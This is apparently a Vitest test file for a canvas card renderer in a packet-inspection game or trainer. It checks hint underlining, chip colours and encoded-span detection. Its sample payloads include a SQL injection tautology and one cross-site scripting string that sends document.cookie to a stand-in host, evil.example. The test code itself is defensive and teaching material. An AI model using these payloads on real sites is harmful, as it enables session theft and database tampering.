// packages
import { describe, expect, it } from 'vitest';

// core
import { LANE_H, PKT_H, PKT_W, PKT_Y } from '../core/constants';

// local
import { CARD_TEX_H, CARD_TEX_W, CHIP_COLOR, drawCard, encodedSpans } from './cards';

// A 2D context that only measures (eight units a character) and records every text it writes and every path it strokes.
const fakeCtx = (calls: string[]): CanvasRenderingContext2D => ({
  fillStyle: '', strokeStyle: '', lineWidth: 0, font: '', textAlign: 'left', textBaseline: 'alphabetic',
  clearRect: () => undefined, fillRect: () => undefined, strokeRect: () => undefined, setLineDash: () => undefined,
  fillText: (s: string) => { calls.push(`fillText:${s}`); }, measureText: (s: string) => ({ width: s.length * 8 }),
  beginPath: () => undefined, moveTo: () => undefined, lineTo: () => undefined, stroke: () => { calls.push('stroke'); },
}) as unknown as CanvasRenderingContext2D;

const strokes = (calls: string[]): number => calls.filter((c) => c === 'stroke').length;

const card = (hints: string[], hintsOn = true) => ({ chip: 'GET' as const, path: '/search', src: '192.0.2.10', payload: "q=' OR 1=1--", hints, hintsOn, decodedTag: null, state: 'idle' as const, root: false });

describe('drawCard', () => {
  it('underlines each hint it finds, once per occurrence', () => {
    const calls: string[] = [];
    // The tautology once, the digit twice, the third never.
    drawCard(fakeCtx(calls), card(["' OR 1=1--", '1', 'nope']));
    expect(strokes(calls)).toBe(3);
  });

  it('underlines nothing with hints off', () => {
    const calls: string[] = [];
    drawCard(fakeCtx(calls), card(["' OR 1=1--"], false));
    expect(strokes(calls)).toBe(0);
  });

  it('skips an empty hint instead of hanging on it', () => {
    const calls: string[] = [];
    drawCard(fakeCtx(calls), card(['', "' OR 1=1--", '']));
    expect(strokes(calls)).toBe(1);
  });
});

describe('card v2', () => {
  it('is 340×54 at 2× and still fits the lane', () => {
    expect([PKT_W, PKT_H, PKT_Y]).toEqual([340, 54, 18]);
    expect([CARD_TEX_W, CARD_TEX_H]).toEqual([680, 108]);
    expect(PKT_Y + PKT_H).toBeLessThanOrEqual(LANE_H - 10);
  });

  it('colours chips by protocol only', () => {
    expect(CHIP_COLOR).toEqual({ GET: '#2fb6ff', POST: '#d9b44a', SSH: '#5fd38d', SMTP: '#b48cff', TCP: '#a4a197' });
  });

  it('finds every percent-escape, and the plus only inside a GET query string', () => {
    expect(encodedSpans('q=%27%20OR%201%3D1--', 'GET')).toEqual([[2, 5], [5, 8], [10, 13], [14, 17]]);
    expect(encodedSpans('q=blue+wool+socks', 'GET')).toEqual([[6, 7], [11, 12]]);
    expect(encodedSpans("q=' OR 1=1--", 'GET')).toEqual([]);
    expect(encodedSpans('100% sure, %zz', 'GET')).toEqual([]);
    // In a JS body the + is an operator, not a space; an escape is an escape on any chip.
    expect(encodedSpans(`"<script>fetch('//evil.example/?c='+document.cookie)</script>"`, 'POST')).toEqual([]);
    expect(encodedSpans('user=a%40b.example pass=x+y', 'POST')).toEqual([[6, 9]]);
  });

  it('dots one cyan underline per encoded span with the hints off', () => {
    const calls: string[] = [];
    drawCard(fakeCtx(calls), { ...card(["' OR 1=1--"], false), payload: 'q=%27%20OR%201%3D1--' });
    expect(strokes(calls)).toBe(4);
  });

  it('computes the spans on the ellipsized text, so none starts past the cut', () => {
    const calls: string[] = [];
    // 100 characters with an escape every 20: the card shows 79 of them and an ellipsis, so the fifth escape is cut off.
    const payload = Array.from({ length: 5 }, (_, i) => `%4${i}${'x'.repeat(17)}`).join('');
    drawCard(fakeCtx(calls), { ...card([], false), payload });
    const shown = calls.find((c) => c.startsWith('fillText:%40x'))!.slice('fillText:'.length);
    expect(shown).toHaveLength(80);
    expect(shown.endsWith('…')).toBe(true);
    expect(calls.filter((c) => /^fillText:%4\d$/.test(c))).toEqual(['fillText:%40', 'fillText:%41', 'fillText:%42', 'fillText:%43']);
    expect(strokes(calls)).toBe(4);
  });

  it('draws the chip, the path, the source and the payload without touching the tells', () => {
    const calls: string[] = [];
    const ctx = fakeCtx(calls);
    drawCard(ctx, { chip: 'GET', path: '/search', src: '203.0.113.121', payload: 'q=%27%20OR%201%3D1--', hints: ["' OR 1=1--"], hintsOn: false, decodedTag: null, state: 'idle', root: false });
    expect(calls).toContain('fillText:GET');
    expect(calls).toContain('fillText:/search');
    expect(calls).toContain('fillText:203.0.113.121');
    expect(calls.some((c) => c.startsWith('fillText:q=%27'))).toBe(true);
    expect(calls.filter((c) => c.startsWith('fillText:%27')).length).toBe(1); // the cyan overdraw of one span
  });
});
